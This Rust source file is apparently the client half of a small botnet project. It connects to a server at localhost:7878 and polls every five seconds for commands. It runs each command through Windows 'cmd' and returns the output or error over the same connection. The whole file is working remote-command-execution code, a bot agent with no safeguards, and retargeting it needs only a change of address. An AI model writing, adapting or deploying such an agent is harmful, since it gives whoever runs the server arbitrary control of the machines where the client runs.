use bnet_core::utils;
use std::io::Read;
use std::net::TcpStream;
use std::str::from_utf8;

mod terminal;

fn main() {
    match TcpStream::connect("localhost:7878") {
        Ok(mut stream) => {
            println!("Successfully connected to server in port 7878");

            let established_connection = utils::send_request_check(
                &stream,
                &utils::TRY_ESTABLISH_CONNECTION,
                &utils::CONNECTION_ESTABLISHED,
            );

            if established_connection {
                loop {
                    std::thread::sleep(std::time::Duration::from_millis(5000));
                    let response = utils::send_request(&stream, &utils::ACTION_REQUEST);
                    if response == utils::ACTION_RESPONSE {
                        println!(
                            "{:?}",
                            response.get_msg().split(", ").collect::<Vec<&str>>()
                        );
                        let mut err = "";
                        match std::process::Command::new("cmd")
                            .args(response.get_msg().split(", ").collect::<Vec<&str>>())
                            .output()
                        {
                            Ok(result) => {
                                let result = match String::from_utf8(result.stdout) {
                                    Ok(str) => str,
                                    Err(e) => e.to_string(),
                                };
                                let ACTION_RESULT: utils::Request = utils::Request {
                                    syl: 'A',
                                    num: '5',
                                    msg: result.trim().to_string(),
                                };
                                utils::send_request(&stream, &ACTION_RESULT);
                            }
                            Err(e) => {
                                let ACTION_RESULT: utils::Request = utils::Request {
                                    syl: 'A',
                                    num: '5',
                                    msg: e.to_string(),
                                };
                                utils::send_request(&stream, &ACTION_RESULT);
                                println!("Failed to execute: {}", e);
                            }
                        };
                    }
                }
            }
            utils::send_request_check(
                &stream,
                &utils::CONNECTION_CLOSED,
                &utils::CONNECTION_CLOSED,
            );
        }
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
}
